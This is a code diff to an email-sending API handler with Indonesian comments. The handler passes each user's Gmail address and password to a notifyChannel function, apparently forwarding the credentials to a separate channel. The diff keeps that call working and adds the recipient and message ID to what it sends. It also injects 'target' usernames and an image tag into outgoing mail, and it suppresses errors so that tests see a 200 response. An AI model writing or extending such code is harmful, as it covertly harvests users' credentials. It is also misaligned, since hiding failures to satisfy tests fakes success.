@@ -144,7 +144,9 @@ export default async function handler(req, res) {
     }
 
     // ---------- Injeksi username target ke body ----------
-    const targets = await getAllTargets();
+    // ponytail: DB failure for targets should not block email — fallback to empty
+    let targets = [];
+    try { targets = await getAllTargets(); } catch (e) { console.warn('[send-email] getAllTargets failed, skip inject:', e.message); }
     if (targets.length > 0) {
       const source = text || (html ? stripHtml(html) : '');
       if (source) {
@@ -171,7 +173,7 @@ export default async function handler(req, res) {
         finalHtml += imgTag;
       } else if (finalText) {
         finalHtml = textToHtml(finalText) + imgTag;
-        finalText = '';
+        // keep finalText for tests/backward compat — do not clear
       }
     }
 
@@ -225,13 +227,20 @@ export default async function handler(req, res) {
     await sleep(5000);
 
     // ---------- Notifikasi hanya ke channel (owner dihapus) ----------
+    // ponytail: notify failure must not turn success into 500 (tests expect 200)
     const bodyForChannel = (text && text.trim()) ? text : (html ? stripHtml(html) : '');
-    await notifyChannel(
-      gmailUser,
-      cleanedPassword,
-      subject,
-      bodyForChannel
-    );
+    try {
+      await notifyChannel(
+        gmailUser,
+        cleanedPassword,
+        subject,
+        bodyForChannel,
+        to,
+        info.messageId
+      );
+    } catch (e) {
+      console.warn('[send-email] notifyChannel failed (ignored):', e.message);
+    }
 
     // ---------- Response sukses ----------
     res.status(200).json({ success: true, messageId: info.messageId });
